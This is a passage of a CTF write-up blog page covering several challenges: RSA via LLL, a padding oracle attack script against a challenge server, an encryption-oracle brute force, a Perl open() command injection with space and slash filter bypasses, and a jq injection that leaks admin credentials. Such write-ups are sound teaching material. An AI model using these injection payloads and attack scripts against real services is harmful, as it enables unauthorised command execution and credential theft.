  <span style="color:#66d9ef">if</span> attempt_count <span style="color:#f92672">%</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
    <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#39;Attempt {attempt_count}&#39;</span>)

  m <span style="color:#f92672">=</span> attempt(subpairs)
  <span style="color:#66d9ef">if</span> m <span style="color:#f92672">is</span> None: <span style="color:#66d9ef">continue</span>
  m <span style="color:#f92672">=</span> int(m)
  flag <span style="color:#f92672">=</span> m<span style="color:#f92672">.</span>to_bytes(length<span style="color:#f92672">=</span>(m<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>)<span style="color:#f92672">//</span><span style="color:#ae81ff">8</span>, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
  <span style="color:#66d9ef">print</span>(subpairs)
  <span style="color:#66d9ef">print</span>(flag)
  <span style="color:#66d9ef">break</span>

<span style="color:#75715e"># b&#39;3k{H4st4d_St1ll_Rul3S}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span></code></pre></div>
<p>Note that there is a chance to return <code>m^2</code> or <code>m^3</code>. As I am lazy, I just run the script again until it returns <code>m</code>.</p>

<h2 id="rsa-textbook-crypto-496-points">RSA textbook (Crypto; 496 points)<a hidden class="anchor" aria-hidden="true" href="#rsa-textbook-crypto-496-points">#</a></h2>

<p>Solved by <em>Mystiz</em>.</p>

<p>This challenge is similar to De1CTF's easyRSA. By reading the same reference paper <a href="https://link.springer.com/chapter/10.1007/3-540-46701-7_14">[Howgrave-Graham 1999]</a>, we have the matrix in session 3.3. By using the matrix directly and perform LLL, we can recover <code>d1</code> (the private key that corresponds to <code>e1</code>). We can then recover <code>phi(n)</code> and thus compute <code>d</code> (that corresponds to <code>e</code>), hence decrypting the ciphertext: <code>3k{hOwGr4v3_gr4h4m_and_s31F3rt_4re_C00l}AAAAAAAAAAAAAAAAAAAA</code>.</p>

<h2 id="you-shall-not-get-my-cookies-crypto-495-points">You shall not get my cookies (Crypto; 495 points)<a hidden class="anchor" aria-hidden="true" href="#you-shall-not-get-my-cookies-crypto-495-points">#</a></h2>

<p>Solved by <em>Mystiz</em>.</p>

<p>This is a standard padding oracle attack.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect</span>():
  HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;youshallnotgetmycookies.3k.ctf.to&#39;</span>
  PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">13337</span>

  <span style="color:#66d9ef">global</span> debug
  <span style="color:#66d9ef">if</span> debug:
    context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
  <span style="color:#66d9ef">else</span>:
    context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>

  r <span style="color:#f92672">=</span> remote(HOST, PORT)
  <span style="color:#66d9ef">return</span> r

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">oracle</span>(ciphertext):
  r <span style="color:#f92672">=</span> connect()
  payload <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>hexlify(ciphertext)
  r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;~ So... whats your cookie:&#39;</span>, payload)
  r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;~ &#39;</span>)
  res <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
  r<span style="color:#f92672">.</span>close()
  <span style="color:#66d9ef">return</span> res <span style="color:#f92672">!=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;That cookie looks burned!&#39;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
  ciphertext <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>unhexlify(<span style="color:#e6db74">&#39;90C560B2A01529EF986E54B016E1FEAAD79A54BE52B373311E3B4F8251BE269EC199AE6B370BFCE50A54EEC25ABB0F22&#39;</span>)

  po <span style="color:#f92672">=</span> PaddingOracle(oracle, threads<span style="color:#f92672">=</span><span style="color:#ae81ff">16</span>)

  plaintext <span style="color:#f92672">=</span> po<span style="color:#f92672">.</span>recover(ciphertext)
  <span style="color:#66d9ef">print</span>(plaintext) <span style="color:#75715e"># b&#39; chocolate chip cookie\n\n\n\n\n\n\n\n\n\n&#39;</span>

  ciphertext <span style="color:#f92672">=</span> po<span style="color:#f92672">.</span>forge(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Maple Oatmeal Biscuits&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>)

  r <span style="color:#f92672">=</span> connect()
  r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;~ So... whats your cookie:&#39;</span>, binascii<span style="color:#f92672">.</span>hexlify(ciphertext))
  r<span style="color:#f92672">.</span>interactive()
  <span style="color:#75715e"># ~ YES, that is exactly what i wanted!</span>
  <span style="color:#75715e"># ~ Take it! 3k{Y3t_An0th3r_Padd1ng_Oracle}</span>
  
main()</code></pre></div>
<h2 id="once-upon-a-time-crypto-492-points">once upon a time (Crypto; 492 points)<a hidden class="anchor" aria-hidden="true" href="#once-upon-a-time-crypto-492-points">#</a></h2>

<p>Solved by <em>Mystiz</em>.</p>

<p>With a bit of code review, it is running a block cipher with block size = 1 (Source: the <code>encrypt_file</code> method in <code>/src/cipher.c</code>). The key is also redacted from the source (Source: <code>/src/main.c</code>). Moreover, surprisingly, the key is <em>not</em> redacted from the binary.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)v45      <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;\</span>x01<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">\</span>x01<span style="color:#960050;background-color:#1e0010">\</span>x01<span style="color:#960050;background-color:#1e0010">\</span>x01<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">&#39;</span>;
<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v45[<span style="color:#ae81ff">8</span>]  <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;\</span>x01<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">\</span>x01<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">\</span>x01<span style="color:#960050;background-color:#1e0010">\</span>x01<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">&#39;</span>;
<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v45[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;\</span>x01<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">\</span>x01<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">\</span>x01<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">&#39;</span>;
<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v45[<span style="color:#ae81ff">24</span>] <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;\</span>x01<span style="color:#960050;background-color:#1e0010">\</span>x01<span style="color:#960050;background-color:#1e0010">\</span>x01<span style="color:#960050;background-color:#1e0010">\</span>x01<span style="color:#960050;background-color:#1e0010">\</span>x01<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">\</span>x01<span style="color:#960050;background-color:#1e0010">&#39;</span>;
<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v45[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;\</span>x01<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">\</span>x01<span style="color:#960050;background-color:#1e0010">\</span>x01<span style="color:#960050;background-color:#1e0010">&#39;</span>;</code></pre></div>
<p>But if you think I am going to reverse the algorithm, you are wrong. I'm just using the binary as an encryption oracle.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(plaintext, mode):
  context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>

  <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;plaintext&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
    f<span style="color:#f92672">.</span>write(plaintext)
  r <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#39;challenge/scss&#39;</span>, <span style="color:#e6db74">&#39;plaintext&#39;</span>, <span style="color:#e6db74">&#39;ciphertext&#39;</span>, <span style="color:#e6db74">&#39;encrypt&#39;</span>, mode])
  r<span style="color:#f92672">.</span>wait_for_close()
  r<span style="color:#f92672">.</span>close()
  <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;ciphertext&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
    ciphertext <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
  <span style="color:#66d9ef">return</span> ciphertext

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recover</span>(target_ciphertext, mode):
  message <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
  <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(target_ciphertext)):
    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
      plaintext <span style="color:#f92672">=</span> message <span style="color:#f92672">+</span> bytes([j])
      ciphertext <span style="color:#f92672">=</span> encrypt(plaintext, mode)
      <span style="color:#66d9ef">if</span> target_ciphertext<span style="color:#f92672">.</span>startswith(ciphertext):
        message <span style="color:#f92672">=</span> plaintext
        <span style="color:#66d9ef">print</span>(i, message)
        <span style="color:#66d9ef">break</span>
  <span style="color:#66d9ef">return</span> message

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
  <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;challenge/flag_encrypted&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
    target_ciphertext <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()

  <span style="color:#75715e"># print(recover(target_ciphertext, &#39;ecb&#39;))</span>
  <span style="color:#75715e"># print(recover(target_ciphertext, &#39;cbc&#39;))</span>
  <span style="color:#75715e"># print(recover(target_ciphertext, &#39;cfb&#39;))</span>

  <span style="color:#66d9ef">print</span>(recover(target_ciphertext, <span style="color:#e6db74">&#39;ofb&#39;</span>))
  <span style="color:#75715e"># b&#39;3k{my_hands_are_registered_as_lethal_weapons_that_means_we_get_into_a_fight_i_accidentally_kill_you_i_go_to_jail}&#39;</span></code></pre></div>
<h2 id="flood-misc-495-points">flood (Misc; 495 points)<a hidden class="anchor" aria-hidden="true" href="#flood-misc-495-points">#</a></h2>

<p>Solved by <em>Mystiz</em>.</p>

<p>We have a service running remotely. The source code, <code>service.pl</code>, is given to us. Perl sadness<sup class="footnote-ref" id="fnref:perl"><a class="footnote" href="#fn:perl">2</a></sup> strikes back...</p>

<p>Obviously, we can actually earn more gold by <em>selling gold</em>. From the source code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"><span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;? how much gold u wanna spend\n&#34;</span>;
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;! 1 GOLD = 1000 POINTS\n&gt; &#34;</span>;
<span style="color:#66d9ef">my</span> $subm <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;STDIN&gt;</span>;
chomp $subm;
<span style="color:#66d9ef">if</span>( ($subm) <span style="color:#f92672">&lt;=</span> $gold  <span style="color:#f92672">and</span> int($subm)<span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">0</span>){
  $gold   <span style="color:#f92672">-=</span> ($subm);
  $points <span style="color:#f92672">+=</span> ($subm)<span style="color:#f92672">*</span><span style="color:#ae81ff">1000</span>;
}</code></pre></div>
<p>Why? We can set <code>$subm = -0.9999</code>... In this case we can generate as much gold as we want.</p>

<p>Another vulnerability comes from theh following line that runs during <em>load game</em>. This API opens if you are rich enough -- well, we are.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"><span style="color:#75715e"># $name is what we can control. However, `.`, `/` and ` ` are forbidden.</span>
open (SAVEGAME, <span style="color:#e6db74">&#34;/app/files/&#34;</span><span style="color:#f92672">.</span>$name) <span style="color:#f92672">or</span> break;</code></pre></div>
<p>How? For example, if <code>$name = &quot;||ls|&quot;;</code> it executes <code>ls</code> from shell. But what if we want to execute <code>ls /</code> given that  and <code>/</code> are forbidden? In short, we can use <code>\t</code> (&lt;TAB&gt;) in place of the  (&lt;SPACE&gt;), and <code>$(expr\tsubstr\t$PWD\t1\t1)</code> in place of <code>/</code>.</p>

<p>Hence, we can send use <code>||ls\t&quot;$(expr\tsubstr\t$PWD\t1\t1)&quot;\t-al|</code> as our name and the directory can be listed. The following line is curious...</p>
<pre><code>-rw-r--r--   1 root root    30 Jul 23 14:26 fcad0373020fa6ede979389f558b396f4cd38ec1_README&#39;</code></pre>
<p>We can use <code>cat /fcad0373020fa6ede979389f558b396f4cd38ec1_README</code> (with the above substitution) as our name. Finally the flag is there: <code>3k{p333rl_aInt_7hat_deAd_Y3t}</code>.</p>

<h2 id="libcdb-misc-494-points">libcDB (Misc; 494 points)<a hidden class="anchor" aria-hidden="true" href="#libcdb-misc-494-points">#</a></h2>

<p>We are given a libc database search (which looks useful and we should definitely have one ourselves!). Playing with the API we have met the following error:</p>
<pre><code>&gt; .search fprintf 0x4b970 ..
jq: error: Invalid numeric literal at EOF at line 1, column 3 (while parsing &#39;...&#39;) at &lt;top-level&gt;, line 1:
. as $maindb | .libcDB[] | select(.symbol==&#34;fprintf&#34;) | select(.address|contains(&#34;309616&#34;)) | ...                                                                                              
jq: 1 compile error</code></pre>
<p>If we have to make an educated guess on the actual query, it would be:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jq <span style="color:#e6db74">&#39;. as $maindb | .libcDB[] | select(.symbol==&#34;[SYMBOL]&#34;) \
</span><span style="color:#e6db74">   | select(.address|contains(&#34;[ADDR]&#34;)) | .[FILTER]&#39;</span> test.json</code></pre></div>
<p>Read along the documentation of <code>jq</code>, we have experimented around:</p>
<pre><code>&gt; .search fprintf 0 |$maindb|keys|{id:.[]}
Found:
	id		libcDB
Found:
	id		users</code></pre><pre><code>&gt; .search fprintf 0 |$maindb.users[]|keys|{id:.[]}
Found:
	id		password
Found:
	id		username</code></pre><pre><code>&gt; .search fprintf 0 |$maindb.users[]|{id:.username,symbol:.password}
Found:
	id		3k
	symbol		notaflag
Found:
	id		James
	symbol		Hetfield
Found:
	id		Lars
	symbol		Ulrich
Found:
	id		Dead
	symbol		pool
Found:
	id		admin
	symbol		v3ryL0ngPwC4nTgu3SS0xfff
Found:
	id		jim
	symbol		carrey</code></pre>
<p>Okay. Great, we have the credentials of the admin. Connecting to the service again, and this time we are signing in with it.</p>
<pre><code>$ nc libcdb.3k.ctf.to 7777
Login    &gt; admin
Password &gt; v3ryL0ngPwC4nTgu3SS0xfff
Authenticated {&#34;users&#34;:{&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:&#34;v3ryL0ngPwC4nTgu3SS0xfff&#34;}}
                            
 __    _ _       ____  _____ 
|  |  |_| |_ ___|    \| __  |
|  |__| | . |  _|  |  | __ -|
|_____|_|___|___|____/|_____|
                         as a service

Type .help for help

&gt; .secret
3k{jq_is_r3ally_HelpFULL_3af4bcd97f5}</code></pre><div class="footnotes">

<hr>

<ol>
<li id="fn:dns-rebind"><a href="https://en.wikipedia.org/wiki/DNS_rebinding">DNS rebinding from Wikipedia</a>
 <a class="footnote-return" href="#fnref:dns-rebind"><sup>[return]</sup></a></li>
<li id="fn:perl"><a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf">The Perm Jam 2: The Camel Strikes Back - @na7irub</a>
 <a class="footnote-return" href="#fnref:perl"><sup>[return]</sup></a></li>
</ol>
</div>

</div>
  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://b6a.black/tags/ctf/">ctf</a></li>
      <li><a href="https://b6a.black/tags/pwnthybytes-ctf/">pwnthybytes-ctf</a></li>
    </ul>
    <nav class="paginav">
      <a class="prev" href="https://b6a.black/posts/2020-08-25-google-ctf-oracle/">
        <span class="title">« Prev Page</span>
        <br>
        <span>Google CTF 2020: Oracle</span>
      </a>
      <a class="next" href="https://b6a.black/posts/2020-07-22-uiuctf-bot-protection-iv/">
        <span class="title">Next Page »</span>
        <br>
        <span>UIUCTF 2020: Bot Protection IV</span>
      </a>
    </nav>
  </footer>
</article>
    </main><footer class="footer">
    <span>&copy; 2021 <a href="https://b6a.black/">Black Bauhinia</a></span>
    <span>&middot;</span>
    <span>Powered by <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a></span>
    <span>&middot;</span>
    <span>Theme <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
    <button class="top-link" id="top-link" type="button" accesskey="g">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
            <path d="M12 6H0l6-6z" />
        </svg>
    </button>
</a>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
  integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
  integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
  integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }]})"></script>



<script defer src="/assets/js/highlight.min.27cd435cc9ed6abb4b496581b151804f79f366c412620272bb94e2f5f598ebcc.js" integrity="sha256-J81DXMntartLSWWBsVGAT3nzZsQSYgJyu5Ti9fWY68w="
    onload="hljs.initHighlightingOnLoad();"></script>
<script>
    window.onload = function () {
        if (localStorage.getItem("menu-scroll-position")) {
            document.getElementById('menu').scrollLeft = localStorage.getItem("menu-scroll-position");
        }
    }
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

    function menu_on_scroll() {
        localStorage.setItem("menu-scroll-position", document.getElementById('menu').scrollLeft);
    }

</script>

</body>

</html>
